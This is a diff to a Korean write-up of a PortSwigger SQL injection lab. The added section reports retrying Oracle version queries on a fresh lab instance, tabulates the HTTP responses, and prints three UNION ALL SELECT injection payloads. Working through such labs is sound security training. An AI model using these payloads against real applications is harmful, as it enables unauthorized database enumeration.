@@ -67,11 +67,26 @@ draft: false
 
 따라서 **이 캡처의 배지는 `Not solved`**다. 위 차이가 판정에 영향을 준 것으로 보이지만, 채점 로직 자체는 확인하지 않았다. 현재 조회에서 `CORE` 행이 없으므로 네 행의 구분자만 바꾸는 것으로 목표의 다섯 문자열을 모두 얻을 수는 없다.
 
-[PortSwigger 공식 풀이](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)는 `v$version`의 `BANNER`를 조회한다. 아래 쿼리는 **이번 캡처에서 실행한 것으로 확인되지 않은 다음 검증 항목**이다.
+### 수집한 열 정보로 재탐색 (2026-09-30)
+
+앞서 저장한 `results.json`에서 문자열 열 후보 세 개를 골라 새 실습 인스턴스에서 다시 조회했다. 동일한 `category` 삽입 지점에 두 열짜리 `UNION ALL SELECT`를 사용했고, 세션 쿠키 값은 기록하지 않았다.
+
+| 조회 대상 | 문자열 열 직접 조회 | `COUNT(*)` 조회 |
+| --- | --- | --- |
+| `PRODUCT_COMPONENT_VERSION` | `PRODUCT`: HTTP 200, 제품명 네 행 | HTTP 200, `4` |
+| `GV_$VERSION` | `BANNER`: HTTP 500 | HTTP 500 |
+| `SM_$VERSION` | `VERSION_TEXT`: HTTP 500 | HTTP 500 |
+| `V_$VERSION` | `BANNER`: HTTP 500 | HTTP 500 |
+
+직접 조회와 행 수 확인에는 다음 형태를 썼다. `COUNT(*)` 대조군도 같은 구문으로 실행했다.
 
 ```sql
-' UNION SELECT BANNER, NULL FROM v$version --
+' UNION ALL SELECT "BANNER", NULL FROM "GV_$VERSION" --
+' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "GV_$VERSION" --
+' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "PRODUCT_COMPONENT_VERSION" --
 ```
+
+세 후보의 오류 응답에는 `Internal Server Error`만 보였고 Oracle 오류 코드는 없었다. 대조군에서는 행 수 조회가 성공했으므로 `COUNT(*)` 구문 자체가 실패한 것은 아니다. 후보 세 곳은 문자열 열을 선택하지 않고 행 수만 요청해도 실패했다. **열 메타데이터에 나타난다는 사실만으로 해당 뷰를 이 계정에서 조회할 수 있다고 판단할 수 없다.** 다만 500의 정확한 원인(권한, 뷰 접근, 그 밖의 SQL 오류)은 이 응답만으로 구별할 수 없다. 목표 문자열 다섯 개를 새로 얻거나 `Solved` 상태를 확인하지는 못했다.
 
 ## 배운 점
 
